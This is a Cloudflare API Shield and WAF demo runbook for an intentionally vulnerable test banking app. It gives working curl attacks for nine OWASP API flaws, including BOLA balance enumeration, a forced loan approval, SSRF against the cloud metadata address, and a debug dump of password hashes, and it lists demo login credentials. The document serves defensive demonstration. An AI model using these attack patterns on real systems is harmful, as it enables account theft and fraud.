POC Banking Attack Guide

PGC Bank × Cloudflare API Shield & WAF — pre-demo checklist, live demo runbook, and per-attack reference. Target: banking.puregroundscoffee.com · All steps verified end-to-end against production.

What this demo proves

The PGC Bank demo app ships nine intentionally vulnerable endpoints mapped to the OWASP API Security Top 10. In the "before" state every attack succeeds against the live application. You then turn on Cloudflare controls (API Shield schema validation + fallthrough rule, WAF custom and rate-limiting rules, managed rules, content scanning) and re-run the identical attacks: every one is blocked at the Cloudflare edge — no application code changes. The audit trail is seeable in Security Events, and API Discovery surfaces the shadow endpoint the customer didn't know they had.

Verification status (measured, not planned):
• test-api.sh — 39/39 PASS against production
• attack-simulation.sh before — 11/11 VULNERABLE
• attack-simulation.sh after — 11/11 BLOCKED, 0 not-blocked
• Legitimate traffic re-tested while protections armed — all 200s (login, accounts, filtered transactions, notifications, profile)
• Arm → disarm cycle leaves the zone in a clean pre-staged state (verified by spot re-checks)

Part 0 — Terminal setup: how to run every command in this guide

Use Git Bash. Every command in this guide is bash + curl. Do not use PowerShell or cmd.exe — PowerShell's curl is a different tool (Invoke-WebRequest) and it mangles JSON quoting; cmd.exe doesn't understand the $(...) syntax at all.

Open the terminal

  • In File Explorer, go to C:\Users\drecla\Dev Projects\banking → right-click inside the folder → Open Git Bash here.
  • Or in VS Code: Terminal → New Terminal, and set the profile dropdown to Git Bash.

Bootstrap once per terminal window

Paste this whole block. It sets the base URL, logs in as the attacker's ordinary customer (chris.brown), stores the JWT in $TOKEN, and finds that user's savings-account id in $SAVINGS_ID. Every attack command below assumes these three variables exist.

BASE=https://banking.puregroundscoffee.com

TOKEN=$(curl.exe -s --ssl-no-revoke -X POST \\
  -H 'Content-Type: application/json' \\
  -d '{"username":"chris.brown","password":"cbrown123"}' \\
  $BASE/api/auth/login | sed -n 's/.*"token":"\\([^\\"]*\\)".*/\\1/p')

SAVINGS_ID=$(curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" \\
  $BASE/api/accounts | sed -n 's/.*{"id":"\\([^\\"]*\\)"[^{]*"account_type":"savings".*/\\1/p' | head -1)

echo "token loaded, savings account $SAVINGS_ID"

Verify it worked: the echo line must print a UUID for the savings account. Tokens last 24h, but re-paste the whole block if you open a new terminal — the variables don't carry over. Note: the login endpoint allows 5 attempts/minute; the bootstrap uses one, each script uses one.

About the flags you'll see

  • curl.exe (not curl) — the real curl, even in Git Bash typing curl.exe is just explicit and safe.
  • --ssl-no-revoke — required on this machine's network (TLS revocation lookups fail); harmless elsewhere.
  • -s — quiet output. Drop it when you want to see headers/errors while troubleshooting.
PowerShell fallback (only if Git Bash is truly unavailable): always type curl.exe (never curl), write JSON bodies to a file with '{"username":"chris.brown","password":"cbrown123"}' | Out-File login.json -Encoding utf8 -NoNewline and send them with --data "@login.json", and capture tokens with $token = (curl.exe ... | ConvertFrom-Json).token.

Part 1 — Pre-demo checklist (run the day before, ~20 minutes)

1a. Machine & network

Run everything from a terminal on the demo machine with the repo checked out at banking\. Scripts use curl.exe --ssl-no-revoke already — nothing to set.
EICAR caveat: this machine's network runs a Cloudflare Gateway policy that blocks the EICAR upload client-side (302 to a block page) before it reaches the zone. Show the content-scanning leg from a network/device without that policy, or accept skipping it. (The zone-side content-scanning block rule is already staged and works when traffic clears the client.)
CLOUDFLARE_API_TOKEN is set (used by scripts/demo-edge-config.py).

1b. Confirm the zone is staged

python scripts/demo-edge-config.py status

Expect: schema validation = log, and six rules listed [off]:

  • Fallthrough block (ops outside the OpenAPI schema)
  • Block unauthenticated /api/internal/debug
  • Block malicious uploads (content scanning)
  • Block any query string on /api/profile
  • Rate limits: /api/users/*/balance · /api/transfers/express · loan/investment POSTs
If anything is missing: run python scripts/demo-edge-config.py sync (re-uploads schema + endpoint list) then ... disarm. Never hand-edit other zone rules; the tool only ever touches rules prefixed PGC demo:.

1c. Rehearse both acts end-to-end

./test-api.sh                  # expect: 39 passed, 0 failed
./attack-simulation.sh before  # expect: every line VULNERABLE

Then re-stage: nothing to undo — the before run leaves demo props (a pending/approved $3000 loan, small transfer noise) that reconcile with balances by design.

1d. Have these open in browser tabs

  • Cloudflare dashboard → zone puregroundscoffee.com → Security → Events (you'll filter last-15-minutes live)
  • Security → API Shield → Web Assets / Discovery (to reveal the shadow API)
  • The app UI logged in as admin (shows the legitimate experience untouched during the demo)
  • The app UI logged in as chris.brown (the attacker's ordinary customer session — use private window)

Part 2 — Live demo runbook (~25 minutes)

Act 0 — Frame and prove the app is real (2 min)

  • Show the homepage and the dashboard UI briefly: a real bank, real balances, real ledger.
  • Run ./test-api.sh → 39 green checks. Say: "Every piece of the UI maps to a public REST API. That's exactly the surface we're about to attack."

Act 1 — "Before": burn it down (10 min)

  • Run ./attack-simulation.sh before.
  • Narrate per line — the per-attack reference below has the exact talking point for each of the nine, in the order the script runs them.
  • Pause on two visible-damage beats: the force-approved $3000 loan (refresh chris.brown's dashboard — the money is there) and the BOLA dump of every customer's balances.

Act 2 — Arm the edge (1 min, live on camera)

python scripts/demo-edge-config.py arm

One command flips schema validation to block and enables all six rules. Say: "This is configuration on your Cloudflare zone — nothing was redeployed, nothing changed in the app's code."

Act 3 — "After": same attacks, different outcome (8 min)

  • Run ./attack-simulation.sh after → expect 11 BLOCKED.
  • Point out the block reasons printed per line (429 rate limit vs 403 schema/fallthrough) — the mechanism is the product story.
  • Switch to Security → Events, filter last 15 minutes: every blocked attempt is there, rule-named.
  • Switch to API Shield → Discovery: GET /api/v1/accounts appears as a discovered operation absent from the uploaded schema — the shadow API, found.
  • Optional manual beat: the EICAR upload (see §3, content-scanning row).

Act 4 — Wrap (3 min)

  • Re-run ./test-api.sh with protections still armed → still 39/39. "Legitimate traffic is untouched; the positive security model only rejects what was never declared."
  • Forward-looking: BOLA ML labels and Volumetric Abuse Detection learn from weeks of production traffic — today's blocks are the deterministic layer; posture detections accrue over time.
  • Leave the zone staged again when done: python scripts/demo-edge-config.py disarm.

Part 3 — Per-attack reference

In script order. BEFORE = expected result with the zone in its default state; AFTER = expected result armed. Every "after" result below was observed live during verification.

Attack 1 · Broken Authentication — OWASP API2

Endpoint: GET /api/internal/debug
Executecurl https://banking.puregroundscoffee.com/api/internal/debug — no credentials at all. What's attackedAn internal diagnostics endpoint that ships with no auth check; dumps the user table including password hashes and salts, plus auth config. Feature showcasedWAF custom rule blocking requests without a Bearer token to internal paths (the toggle-ready, deterministic version of API Shield JWT validation; the full JWT-validation variant needs the JWT secret pasted in the dashboard — optional extra, not required). Before200 — full dump After403 at the edge Prep neededNone (rule is staged). 
curl.exe -s --ssl-no-revoke $BASE/api/internal/debug
# before: JSON with every user incl. "password_hash" and "salt"
# after:  HTTP 403 — the request never reached the app

Attack 2 · Shadow API / Improper Inventory — OWASP API9

Endpoint: GET /api/v1/accounts (also accepts a ?userId= override)
Executecurl -H "Authorization: Bearer $TOKEN" $BASE/api/v1/accounts What's attackedA deprecated v1 endpoint that was never decommissioned: undocumented, missing from the OpenAPI schema, and serving verbose rows. Feature showcasedAPI Discovery (finds the shadow op in traffic) + schema-validation fallthrough rule — anything not in the uploaded schema is treated as hostile. Before200 — verbose data served After403 fallthrough block Prep neededSchema uploaded during staging (already done — demo-edge-config.py sync). 
curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" $BASE/api/v1/accounts
# and the never-removed cross-user override:
curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" "$BASE/api/v1/accounts?userId=f49a7d79-e6dc-4c91-ba4a-5d62be9f81e7"

Attack 3 · Broken Function Level Authorization — OWASP API5

Endpoints: GET /api/admin/users · POST /api/admin/loans/:id/force-approve
ExecuteWith an ordinary customer's token: list all users, then apply for a $3000 loan (goes to pending_review) and force-approve it — the script does this automatically and the money really lands. What's attackedAdmin-only functions with no role check — any customer token works. Feature showcasedFallthrough rule again (neither admin path exists in the schema). Optional upgrade: a JWT-validation rule on the token's role claim (tokens already carry it; edge rule needs the JWT secret configured in the dashboard). Before200 — list leaked; $3000 loan approved & disbursed After403; the loan stays pending_review Prep neededNone. 
curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" $BASE/api/admin/users

# apply for $3000 (auto-lands as pending_review), grab its id, then force-approve it:
LOAN=$(curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \\
  -H 'Content-Type: application/json' \\
  -d "{\"amount\":3000,\"termMonths\":24,\"disburseAccountId\":\"$SAVINGS_ID\"}" \\
  $BASE/api/loans/apply)
LOAN_ID=$(printf '%s' "$LOAN" | sed -n 's/.*"id":"\\([^\\"]*\\)".*/\\1/p')
curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \\
  $BASE/api/admin/loans/$LOAN_ID/force-approve
# before: {"message":"Loan approved and disbursed",...} — refresh the dashboard, the money is there
# after:  HTTP 403 — and the loan is still pending_review

Attack 4 · Broken Object Level Authorization (BOLA) — OWASP API1

Endpoint: GET /api/users/:userId/balance
ExecuteEnumerates every user id (from the debug dump) and reads each victim's balances. When the dump is already blocked (after state), the script falls back to one known id so the enumeration attempt itself is still shown. What's attackedNo ownership check: any authenticated user reads any user's balances just by guessing/collecting ids. Feature showcasedRate-limiting rule on the path (enumeration is inherently high-rate per session) plus the fallthrough rule (the path isn't in the schema either) — mention both layers: rate limiting catches even *declared*-endpoint enumeration in a real deployment. Before5 customer profiles harvested After403/429 — enumeration dies Prep neededNone. Forward-looking note: Cloudflare's ML BOLA labels accrue on production traffic (10k+ sessions) — not shown live, position as posture tooling. 
# collect victim ids from the debug dump (works in "before"), then enumerate:
IDS=$(curl.exe -s --ssl-no-revoke $BASE/api/internal/debug \\
  | grep -oE '"id":"[0-9a-f-]{36}"' | cut -d'"' -f4 | sort -u)
for uid in $IDS; do
  curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" $BASE/api/users/$uid/balance; echo
done
# after: 403 on every one (fallthrough), or 429 once the enumeration rate limit trips

Attack 5 · Excessive Data Exposure — OWASP API3

Endpoint: GET /api/profile and GET /api/profile?internal=1
ExecuteFetch /api/profile (base response already leaks password hash + salt), then flip ?internal=1 for full-record mode. What's attackedAn endpoint returning far more than the UI needs, with an undocumented debug parameter. Feature showcasedWAF custom rule rejecting any query string on /api/profile (the schema declares no parameters). Honest nuance to say out loud: the base response leak is an app-side fix — the edge cannot redact response bodies; it blocks the undocumented access path. BeforeBoth leak After?internal=1 → 403; base leak shown as the fix-the-app talking point Prep neededNone. 
curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" "$BASE/api/profile"
# note "passwordHash" and "salt" right there in the base response
curl.exe -s --ssl-no-revoke -H "Authorization: Bearer $TOKEN" "$BASE/api/profile?internal=1"
# before: internal mode adds session payload + raw account rows
# after:  HTTP 403 — query string isn't in the documented contract

Attack 6 · Unrestricted Resource Consumption — OWASP API4

Endpoint: POST /api/transfers/express
Execute20 × $0.01 transfers, no pauses. What's attackedA transfer endpoint cloned from the real one minus every rate limit — a burst runs unthrottled. Feature showcasedWAF rate-limiting rule (429 after 10/min; also fallthrough-blocked since the path is undocumented). Contrast with the real transfer endpoint's in-app KV limiter: the edge rule is the same control, zero code. Before20/20 completed After403/429 — burst dies Prep neededNone. 
for i in $(seq 1 20); do
  curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \\
    -H 'Content-Type: application/json' \\
    -d "{\"fromAccountId\":\"$SAVINGS_ID\",\"toUsername\":\"sarah.johnson\",\"toAccountType\":\"savings\",\"amount\":0.01}" \\
    $BASE/api/transfers/express; echo
done
# before: 20 x "Express transfer completed"
# after:  HTTP 403 (undocumented path) from the first request

Attack 7 · Sensitive Business Flows — OWASP API6

Endpoint: POST /api/loans/apply (existing legitimate endpoint — no frequency cap)
Execute8 rapid $2000 loan applications (all stay pending_review; nothing disburses). What's attackedApplication spam: nothing limits how many applications one customer can file per day. Feature showcasedRate-limiting rule on loans/investments POSTs (5/min). Forward-looking pair: Volumetric Abuse Detection recommends per-endpoint, per-session limits from learned baselines in production. Before8/8 filed in seconds After429 past the fifth request Prep neededNone. 
for i in $(seq 1 8); do
  curl.exe -s --ssl-no-revoke -o /dev/null -w "application $i -> %{http_code}\n" --ssl-no-revoke \\
    -X POST -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \\
    -d '{"amount":2000,"termMonths":12}' $BASE/api/loans/apply
done
# before: eight 201s         after: five 201s then 429s

Attack 8 · Server-Side Request Forgery (SSRF) — OWASP API7

Endpoint: POST /api/profile/avatar-from-url
Execute{"url":"https://example.com/"} — the Worker fetches server-side and returns the body. Then mention/{"url":"http://169.254.169.254/latest/meta-data"} (cloud metadata; same kill at the edge). What's attackedAny attacker-chosen URL is fetched by the server with no validation. Feature showcasedFallthrough rule (the path is outside the documented API) — and for a documented variant, schema URL-allowlisting. Say plainly: the definitive SSRF fix is origin-side allowlisting; the edge compresses the attack surface to only-declared operations. Before200 — external body exfiltrated through the Worker After403 Prep neededNone. (Workers cannot actually reach link-local IPs — use example.com for the visible exfil proof.) 
curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \\
  -H 'Content-Type: application/json' \\
  -d '{"url":"https://example.com/"}' \\
  $BASE/api/profile/avatar-from-url
# before: {"fetchedUrl":...,"bodyPreview":"..."} — the Worker fetched it for us
# after:  HTTP 403 before the Worker ever runs

Attack 9 · Security Misconfiguration — OWASP API8

Endpoint: POST /api/debug/parse
ExecuteSend malformed JSON → the app 500s with a JS stack trace including server-side file paths and internals. What's attackedUnsanitized error responses leaking implementation detail that guides further attacks. Feature showcasedSchema strict typing + fallthrough: malformed bodies never reach the Worker, and this path isn't documented anyway → clean edge rejection, no error surface to mine. Before500 with stack trace After403/400 at the edge Prep neededNone. 
curl.exe -s --ssl-no-revoke -X POST -H "Authorization: Bearer $TOKEN" \\
  -H 'Content-Type: application/json' \\
  -d '{not json' \\
  $BASE/api/debug/parse
# before: 500 with a JavaScript stack trace and internal file paths
# after:  a clean edge rejection — no error surface to mine
